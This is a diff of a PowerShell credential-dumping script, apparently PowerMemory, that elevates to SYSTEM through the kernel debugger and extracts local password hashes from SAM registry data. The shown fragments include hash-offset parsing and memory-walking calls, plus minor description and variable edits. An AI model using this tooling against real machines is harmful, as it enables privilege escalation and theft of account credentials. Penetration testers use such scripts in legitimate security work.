@@ -1,14 +1,14 @@
 ﻿<# 
 .SYNOPSIS 
-Dump local passwords hashes with last logon time and password last set
+Dump local passwords hashes. 
  
 .DESCRIPTION 
-    This script try to elevate itself to system with kernel debugger then dump hashes by doing WMI requests.
-    It can be modified to dump hashes remotely.
+This script try to elevate itself to system with kernel debugger then dump hashes.
+It can be modified to dump hashes remotely 
 
 .LINK 
 Original script: powerdump written by David Kennedy http://www.labofapenetrationtester.com/2013/05/poshing-hashes-part-2.html?showComment=1386725874167#c8513980725823764060
-Nishang script modifying ACL in registry: https://github.com/samratashok/nishang
+Second script modifying ACL in registry: https://github.com/samratashok/nishang
 https://github.com/giMini/PowerMemory
 .Notes
 Reflection added by https://github.com/Zer1t0
@@ -693,7 +693,6 @@ Switch ($mode) {
 }
 
 
-
 $Process = "$((Get-Process -ID $pid).Name).exe"
 Write-Output "`r`n=============================="
 whoami
@@ -754,6 +753,7 @@ Write-InFile $buffer "$chain"
 $tabOffset = Call-MemoryWalker $kd $file $fullScriptPath $symbols
 $tabFA = ($tabOffset -split ' ')    
 $fi = [array]::indexof($tabFA,"lkd>") + 17 + $delta
+$sidValue = ""
 $sidValue = $tabFA[$fi]
 Write-Output "SID is: $sidValue"
 
@@ -829,7 +829,7 @@ if ($subKeys.ReturnValue -eq 0) {
             $userName = Get-UserName $($V.Data)
             $hashOffset = [BitConverter]::ToUInt32($($V.Data)[0x9c..0x9f],0) + 0xCC            
             $rid = [Convert]::ToInt32($name, 16)
-            
+            $(Get-LastLogonDate($($F.Data)))
             if($(Get-LastLogonDate($($F.Data))) -eq "0x0000000000000000"){
                 $logonDate = "Empty"
             }
